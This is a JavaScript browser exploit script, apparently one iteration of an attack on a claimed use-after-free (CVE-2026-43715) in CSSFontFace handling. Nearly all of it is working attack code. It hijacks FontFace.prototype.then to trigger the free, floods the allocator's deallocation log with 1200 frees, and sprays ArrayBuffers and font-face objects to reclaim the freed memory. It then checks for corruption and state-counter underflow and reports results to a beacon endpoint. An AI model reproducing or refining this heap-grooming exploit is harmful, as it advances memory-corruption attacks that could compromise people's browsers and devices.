// p455-fontface-uaf-logflush.js — CVE-2026-43715 UAF with deallocation log flush
//
// ROOT CAUSE OF ZERO SPRAY: libpas deallocation log holds 1000 entries.
// Freed slots don't become available until the log fills and flushes.
// V449-V454 only freed ~750 objects → log never flushed.
//
// FIX: Free 1100+ objects through fastMalloc AFTER the target CSSFontFace
// is freed, pushing the log to 1000 → flush → freed slot available → spray lands.
//
// ALSO: Test double-decrement detection (m_activeCount underflow → UINT_MAX)
(function() {
    var RUN = 'p455-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: AB spray with 1100 log-flush frees
    // Uses ArrayBuffers for both log flush AND spray (same fastMalloc heap)
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p455a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];
        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p455a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';
            var sprayABs = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Step 1: Trigger adopt → free old CSSFontFace
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Step 2: Flush deallocation log by freeing 1100 ArrayBuffers
                    // Each AB backing store goes through fastMalloc/fastFree
                    // We allocate then null them out → GC won't collect immediately
                    // but we need SYNCHRONOUS frees. Use explicit deref pattern:
                    // Allocate small ABs, store in array, then replace with new ones
                    // (old ones become unreferenced → eligible for free)
                    //
                    // Actually: JS GC is not synchronous. We need a different approach.
                    // Use ArrayBuffer.transfer() to explicitly detach → backing freed immediately.
                    // OR: allocate many objects via DOM APIs (which use fastMalloc internally)
                    //
                    // Best approach: create and remove DOM nodes. Each DOM node allocation/free
                    // goes through fastMalloc. 1100 create+remove cycles = 1100 frees.
                    for (var i = 0; i < 1200; i++) {
                        var d = document.createElement('div');
                        document.body.appendChild(d);
                        d.remove(); // fastFree of the node
                    }

                    // Step 3: Spray with ArrayBuffers across likely size classes
                    // CSSFontFace is ~200-400 bytes. Spray multiple sizes.
                    for (var sz = 128; sz <= 512; sz += 16) {
                        for (var j = 0; j < 50; j++) {
                            var ab = new ArrayBuffer(sz);
                            var dv = new DataView(ab);
                            for (var off = 0; off < sz; off += 4) {
                                dv.setUint32(off, 0x50000000 + off, true);
                            }
                            sprayABs.push({ab: ab, sz: sz});
                        }
                    }
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {thenFired: thenA, err: aErr, statusAfter: faceA.status});

            // Scan for corruption
            var hitSizes = [];
            for (var k = 0; k < sprayABs.length; k++) {
                var item = sprayABs[k];
                var dv = new DataView(item.ab);
                for (var off = 0; off < item.sz; off += 4) {
                    var expected = 0x50000000 + off;
                    var actual = dv.getUint32(off, true);
                    if (actual !== expected) {
                        hitSizes.push({
                            idx: k, sz: item.sz, off: off,
                            exp: expected.toString(16),
                            got: actual.toString(16)
                        });
                        break;
                    }
                }
            }
            B('A-SPRAY', {total: sprayABs.length, hits: hitSizes.length, details: hitSizes.slice(0, 10)});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Same-type spray with log flush via @font-face cycling
    // Create 1200 @font-face rules (CSSFontFace objects go through fastMalloc)
    // then remove them all (1200 frees → flushes log)
    // then trigger UAF, then spray 300 new CSSFontFaces
    // ═══════════════════════════════════════════════════════════════
    try {
        // Phase 1: Create and destroy 1200 CSSFontFaces to flush dealloc log
        var flushStyles = [];
        for (var i = 0; i < 1200; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'fl" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            flushStyles.push(s);
        }
        document.body.offsetHeight;

        for (var i = 0; i < flushStyles.length; i++) {
            flushStyles[i].remove();
        }
        document.body.offsetHeight;
        flushStyles = null;

        B('B-FLUSHED', 'created-and-freed=1200');

        // Phase 2: Target face
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p455b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];
        var faceB = null;
        var itB = document.fonts.values();
        var eB;
        while (!(eB = itB.next()).done) {
            if (eB.value.family.replace(/['"]/g, '') === 'p455b') { faceB = eB.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    // Trigger adopt → free old CSSFontFace
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Flush dealloc log: 1200 more CSSFontFace create+destroy
                    var flush2 = [];
                    for (var i = 0; i < 1200; i++) {
                        var s = document.createElement('style');
                        s.textContent = "@font-face { font-family: 'f2" + i + "'; src: local('Arial'); }";
                        document.head.appendChild(s);
                        flush2.push(s);
                    }
                    document.body.offsetHeight;
                    for (var i = 0; i < flush2.length; i++) flush2[i].remove();
                    document.body.offsetHeight;

                    // Now spray: freed slot should be available
                    for (var i = 0; i < 300; i++) {
                        var s = document.createElement('style');
                        s.textContent = "@font-face { font-family: 'sb" + i + "'; src: local('ZZZZZ_NoFont_" + i + "'); }";
                        document.head.appendChild(s);
                    }
                    document.body.offsetHeight;
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {thenFired: thenB, err: bErr, statusAfter: faceB.status});

            // Check for "loaded" status on spray faces (UAF wrote Success)
            var bLoaded = [], bTotal = 0;
            var itB2 = document.fonts.values();
            var eB2;
            while (!(eB2 = itB2.next()).done) {
                var fn = eB2.value.family.replace(/['"]/g, '');
                if (fn.indexOf('sb') === 0 && fn.length <= 5) {
                    bTotal++;
                    if (eB2.value.status === 'loaded') bLoaded.push(fn);
                }
            }
            B('B-CHECK', {total: bTotal, loaded: bLoaded.length, names: bLoaded.slice(0, 10)});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Double-decrement detection (m_activeCount underflow)
    // After UAF, load a new font. If document.fonts.onloading doesn't
    // fire, m_activeCount = UINT_MAX → state machine broken → UAF CONFIRMED
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p455c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var ruleC = styleC.sheet.cssRules[0];
        var faceC = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'p455c') { faceC = eC.value; break; }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var thenC = 0, cErr = '';
            var loadingFired = 0, loadingDoneFired = 0;

            // Set up event listeners BEFORE trigger
            document.fonts.onloading = function() { loadingFired++; };
            document.fonts.onloadingdone = function() { loadingDoneFired++; };

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    ruleC.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-TRIGGERED', {
                thenFired: thenC,
                statusAfter: faceC.status,
                fontsStat: document.fonts.status,
                loadingBefore: loadingFired,
                loadingDoneBefore: loadingDoneFired
            });

            // Reset counters
            loadingFired = 0;
            loadingDoneFired = 0;

            // Now load ANOTHER font — check if state machine works
            var styleC2 = document.createElement('style');
            styleC2.textContent = "@font-face { font-family: 'p455c2'; src: local('Arial'); }";
            document.head.appendChild(styleC2);
            document.body.offsetHeight;

            // Force the new face to load
            var faceC2 = null;
            var itC2 = document.fonts.values();
            var eC2;
            while (!(eC2 = itC2.next()).done) {
                if (eC2.value.family.replace(/['"]/g, '') === 'p455c2') { faceC2 = eC2.value; break; }
            }

            if (faceC2) {
                try { faceC2.load(); } catch(e) {}
            }

            B('C-STATE-CHECK', {
                fontsStat: document.fonts.status,
                c2Status: faceC2 ? faceC2.status : 'NOT-FOUND',
                loadingFired: loadingFired,
                loadingDoneFired: loadingDoneFired,
                verdict: loadingFired === 0 ? 'BROKEN-STATE-MACHINE' : 'NORMAL'
            });

            // Also check without the font-face trigger — just JS FontFace
            loadingFired = 0;
            loadingDoneFired = 0;
            var jsFont = new FontFace('p455js', "local('Arial')");
            document.fonts.add(jsFont);
            jsFont.load();

            B('C-JSFONT-CHECK', {
                status: jsFont.status,
                loadingFired: loadingFired,
                loadingDoneFired: loadingDoneFired,
                fontsStat: document.fonts.status,
                verdict: loadingFired === 0 ? 'BROKEN' : 'NORMAL'
            });
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
